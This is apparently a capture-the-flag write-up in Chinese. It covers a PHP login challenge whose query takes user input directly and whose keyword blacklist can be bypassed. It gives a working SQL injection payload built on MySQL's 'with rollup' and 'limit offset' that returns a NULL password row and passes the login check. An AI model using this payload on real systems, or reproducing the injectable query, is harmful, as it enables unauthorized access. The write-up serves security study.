# Challenge 
```php 
<?php
error_reporting(0);
if (!isset($_POST['uname']) || !isset($_POST['pwd'])) {
	echo '<form action="" method="post">'."<br/>";
	echo '<input name="uname" type="text"/>'."<br/>";
	echo '<input name="pwd" type="text"/>'."<br/>";
	echo '<input type="submit" />'."<br/>";
	echo '</form>'."<br/>";
	echo '<!--source: source.txt-->'."<br/>";
    die;
}
function AttackFilter($StrKey,$StrValue,$ArrReq){  
    if (is_array($StrValue)){
        $StrValue=implode($StrValue);
    }
    if (preg_match("/".$ArrReq."/is",$StrValue)==1){   
        print "水可载舟，亦可赛艇！";
        exit();
    }
}
$filter = "and|select|from|where|union|join|sleep|benchmark|,|\(|\)";
foreach($_POST as $key=>$value){
    AttackFilter($key,$value,$filter);
}
$con = mysql_connect("XXXXXX","XXXXXX","XXXXXX");
if (!$con){
	die('Could not connect: ' . mysql_error());
}
$db="XXXXXX";
mysql_select_db($db, $con);
$sql="SELECT * FROM interest WHERE uname = '{$_POST['uname']}'";
$query = mysql_query($sql);
if (mysql_num_rows($query) == 1) {
    $key = mysql_fetch_array($query);
    if($key['pwd'] == $_POST['pwd']) {
        print "CTF{XXXXXX}";
    }else{
        print "亦可赛艇！";
    }
}else{
	print "一颗赛艇！";
}
mysql_close($con);
?>
```
# Solution

用到mysql中的`with rollup`技巧。用普通的select查询下；
```
mysql> SELECT uname,pass FROM test.table;
+---------+------+
| uname   | pass |
+---------+------+
| chybeta | 123  |
+---------+------+
1 row in set (0.00 sec)
```
在加上`group by pass with rollup`后
```
mysql> SELECT uname,pass FROM test.table group by pass with rollup;
+---------+------+
| uname   | pass |
+---------+------+
| chybeta | 123  |
| chybeta | NULL |
+---------+------+
2 rows in set (0.01 sec)
```
rollup在查询结果中加上了一行，并且pass字段的值为NULL。这样当我们post进的pwd的值为空，就能满足`$key['pwd'] == $_POST['pwd']`的条件了。

在此之前我们还有一个条件要满足`mysql_num_rows($query) == 1`，我们要选择pass为NULL的单独的这一条记录。从源码分析可得，过滤了逗号，我们不能简单的使用`limit 1,1`这样的语法，而是可以使用`limit 1 offset 1`。就本地环境而言，比如

```
mysql> SELECT uname,pass FROM test.table group by pass with rollup limit 1 offset 1;
+---------+------+
| uname   | pass |
+---------+------+
| chybeta | NULL |
+---------+------+
1 row in set (0.01 sec)
```

payload:
```
uname='  or 1=1 group by pwd with rollup limit 1 offset 2 #&pwd=
```

# Refference
+ [chybeta : 因缺思汀的绕过](https://chybeta.github.io/2017/07/24/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-writeup/#%E5%9B%A0%E7%BC%BA%E6%80%9D%E6%B1%80%E7%9A%84%E7%BB%95%E8%BF%87)